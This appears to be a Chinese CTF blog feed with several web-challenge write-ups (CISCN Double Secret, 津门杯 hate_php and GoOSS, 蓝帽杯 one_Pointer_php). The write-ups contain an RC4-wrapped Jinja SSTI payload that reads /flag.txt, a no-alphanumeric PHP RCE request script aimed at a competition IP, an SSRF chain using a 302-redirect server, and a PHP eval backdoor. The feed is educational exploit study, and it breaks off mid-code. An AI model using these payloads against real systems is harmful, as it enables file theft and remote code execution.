class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210514143837632.png" alt="image-20210514143837632"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;ciscn2019-华东南赛区double-secret&quot;&gt;[CISCN2019 华东南赛区]Double Secret&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;Welcome To Find Secret&lt;/p&gt;
&lt;p&gt;记录一下……&lt;/p&gt;
&lt;p&gt;寻找secre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>津门杯hate_php</title>
    <link href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/"/>
    <id>http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFhate-php/</id>
    <published>2021-05-12T12:59:43.000Z</published>
    <updated>2021-05-12T13:06:29.837Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="津门杯hate_php">津门杯hate_php</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>p神！</strong>：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p><p>可以在res中看到php版本为5.x，这里就需要用到p神的php5下的上传临时文件+通配符RCE</p><blockquote><p>多过滤一个@，看着ascii往前换一个就行</p></blockquote><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://122.112.214.101:20004/index.php?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url=url,files=files)</span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><blockquote><p>有一定概率性……</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;津门杯hate_php&quot;&gt;津门杯hate_php&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/spa</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>津门杯GoOSS</title>
    <link href="http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/"/>
    <id>http://example.com/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/</id>
    <published>2021-05-12T11:51:48.000Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="津门杯gooss">津门杯GoOSS</span></h3><blockquote><p>弄懂这道题花了我很长时间，期间走了很多弯路……（<strong>wotaicaile</strong></p><p>在写这道题的路上，我学习(了解)了DNS绑定攻击、Google账号验证、免费域名注册(白嫖)、golang、搭建go环境、gin、dlv调试golang……</p></blockquote><h4><span id="gin代码">gin代码</span></h4><p>在go程序最前可以看到：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>&quot;github.com/gin-gonic/gin&quot;</code>既是gin框架，所以既要看得懂go，也要学看gin……</p><p>路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.Use(fileMidderware)</span><br><span class="line">r.POST(<span class="string">&quot;/vul&quot;</span>, vulController)</span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, uploadController)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">_ = r.Run(<span class="string">&quot;:1234&quot;</span>) <span class="comment">// listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>r.Use(fileMidderware)</code>设置了全局中间件</p><p><code>r.POST(&quot;/vul&quot;, vulController)</code>设置了对该路径请求的局部中间件</p><p>vulController：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url Url</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;url); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>捆绑url为json格式，post传参时需要传：<code>&#123;&quot;url&quot;:&quot;xxxx&quot;&#125;</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasPrefix(url.Url, <span class="string">&quot;http://127.0.0.1:1234/&quot;</span>) &#123;</span><br><span class="line">c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;url forbidden&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">client := &amp;http.Client&#123;Timeout: <span class="number">2</span> * time.Second&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">resp, err := client.Get(url.Url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制了内网访问的端口</p><p>uploadController：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file File</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;file); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dir := md5sum(file.Name)</span><br><span class="line"></span><br><span class="line">_, err := http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">e := os.Mkdir(<span class="string">&quot;./files/&quot;</span>+dir, os.ModePerm)</span><br><span class="line">_, _ = http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: e.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">filename := md5sum(file.Content)</span><br><span class="line">path := <span class="string">&quot;./files/&quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename</span><br><span class="line">err = ioutil.WriteFile(path, []<span class="keyword">byte</span>(file.Content), os.ModePerm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;message&quot;</span>: <span class="string">&quot;file upload succ, path: &quot;</span> + dir + <span class="string">&quot;/&quot;</span> + filename,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概是在files文件夹下上传文件的功能，当时尝试了下，似乎并不存在什么漏洞……</p><p>fileMidderware:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileMidderware</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">fileSystem := http.Dir(<span class="string">&quot;./files/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.String() == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">f, err := fileSystem.Open(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> f == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line">fi, err := f.Stat()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> fi.IsDir() &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">files := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">l, _ := f.Readdir(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> l &#123;</span><br><span class="line">files = <span class="built_in">append</span>(files, i.Name())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line"><span class="string">&quot;files&quot;</span>: files,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">data, _ := ioutil.ReadAll(f)</span><br><span class="line">c.Header(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">`attachment; filename=`</span>+fi.Name())</span><br><span class="line">c.Data(<span class="number">200</span>, <span class="string">&quot;text/plain&quot;</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在/vul中请求<code>&#123;&quot;url&quot;:&quot;127.0.0.1:1234/../&quot;&#125;</code>:</p><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512201947610.png" alt="image-20210512201947610"></p><p>访问到了上级files目录，不存在别的东西了……</p><p>源码给了index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// php in localhost port 80</span></span><br><span class="line"></span><br><span class="line">readfile($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果能访问到80默认端口上的index并传参就可以获取flag</p><h4><span id="ssrf">ssrf</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">fmt.Println(c.Request.URL.String())</span><br><span class="line">c.Redirect(<span class="number">302</span>, c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure><p>关键是这里的代码……由于gin的配置，访问<code>xxx.xxx.xxx/haha</code>与<code>xxx.xxx.xxx/haha/</code>并不相同</p><p><code>strings.HasSuffix</code>检测<code>c.Request.URL</code>是否以\结尾，若不是则加上并跳转。大概本意也许是想解决这个问题？(好像哪里又不大对)……</p><p>配置好dlv调试代码服务：</p><img src="/images/津门杯GoOSS/image-20210512203038285.png" alt="image-20210512203038285" style="zoom:80%;"><p>c中含有request：</p><img src="/images/津门杯GoOSS/image-20210512203334500.png" alt="image-20210512203334500" style="zoom:80%;"><p>request中含有host和url，这里的url应该类似为资源文件？</p><img src="/images/津门杯GoOSS/image-20210512204621788.png" alt="image-20210512204621788" style="zoom:80%;"><p>如果我们传入：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.1:1234//1/..&quot;&#125;</code>：</p><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512203705614.png" alt="image-20210512203705614"></p><p>网站尝试解析网址<strong>1</strong>……</p><p>在不以<code>/</code>结尾的情况下，302跳转直接使用<strong>c.Request.URL</strong>进行跳转，类似加载外部js，拼接上<code>/</code>后，<code>//1/../</code>被认为是相对url并予以访问（大概），造成ssrf（应该）。</p><blockquote><p><a href="https://guokeya.github.io/post/5IcFhBKyk/">https://guokeya.github.io/post/5IcFhBKyk/</a></p><p>大师傅说：</p><p>Location可以控制为//，而//就是省略HTTP协议的写法，以作参考。</p></blockquote><h4><span id="302跳转">302跳转</span></h4><p>我们现在能控制目标机访问外网，那怎么利用这一点呢……</p><p>我们可以在自己的服务器写一个302跳转，使目标机访问后跳转到(目标机)本机的默认端口上并读取flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Location: http://127.0.0.1/index.php?file=/flag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/image-20210512205534307.png" alt="image-20210512205534307"></p><p>获得flag！</p><p>流程：</p><p>访问/vul-》fileMidderware-》vulController-》<code>resp, err := client.Get(url.Url)</code>-》fileMidderware-》<strong>302跳转</strong>(c.Request.URL)-》服务器-》<strong>302跳转</strong>-》127.0.0.1/index.php?file=xxx-》flag</p><blockquote><p>总之还是搞了不少东西的，虽然有很多无用功，花了好几天，但也很增长知识。</p><p>如果哪里我理解的不对希望能告诉我！</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;津门杯gooss&quot;&gt;津门杯GoOSS&lt;/span&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;弄懂这道题花了我很长时间，期间走了很多弯路……（&lt;strong&gt;wotaicaile&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在写这道题的路上，我学习(了解)了DNS绑</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>蓝帽杯2021复现</title>
    <link href="http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-08T09:28:24.000Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="蓝帽杯2021复现">蓝帽杯2021复现</span></h3><h4><span id="one_pointer_php">one_Pointer_php</span></h4><p>buu上开了环境，真不错</p><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>add_api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$user=<span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就两个文件……</p><p>当时看了半天，就只知道要绕过<code>if($count[]=1)</code>……可这玩意不是恒对的吗……</p><p>这关系到php的索引数组溢出</p><h5><span id="php数组">PHP数组</span></h5><p><a href="https://blog.csdn.net/weixin_43821278/article/details/114763459">https://blog.csdn.net/weixin_43821278/article/details/114763459</a></p><p>根据这篇文章的实验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php 5.59nts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">2147483647</span>]=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">$a[]=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="D:\HexoBlog\source\images\蓝帽杯2021复现\image-20210508181911478.png" alt="image-20210508181911478"></p><blockquote><p>$a[]访问到的是当前最大数值索引的下一位</p></blockquote><p>也就是说，在5.5.9nts版本下，2147483647就是数值索引的界限，而2147483647正是5.5.9版本中默认设置的整型最大值：<code>PHP_INT_MAX:int(2147483647)</code>。</p><p>这里的int，是<strong>有符号32位二进制可表示的最大数</strong>。</p><blockquote><p><strong>2^31-1</strong>=<strong>2147483647</strong></p></blockquote><p>如果超过了呢？</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png" alt="image-20210513165829865"></p><p>这里会转化为范围更大的float储存……</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png" alt="image-20210513165839374"></p><p>数组中溢出后就会回滚从int的最小值，于是会符合这样的规律：</p><blockquote><p>0—2147483647                       下标0~2147483647 </p><p>2147483648—4294967296   下标-2147483648~0 </p><p>4294967296—6442450943   下标 0~2147483647</p><p>下一个溢出为0的数字是：8589934592</p></blockquote><p>这样使用似乎没什么问题，但如果是通过<code>$a[]</code>去获取就会产生报错，相关版本的题目是<code>XCTF-favorite_number</code>，可以研究研究。</p><h5><span id="较新的版本">较新的版本</span></h5><p>这里是7.3.4nts的php版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 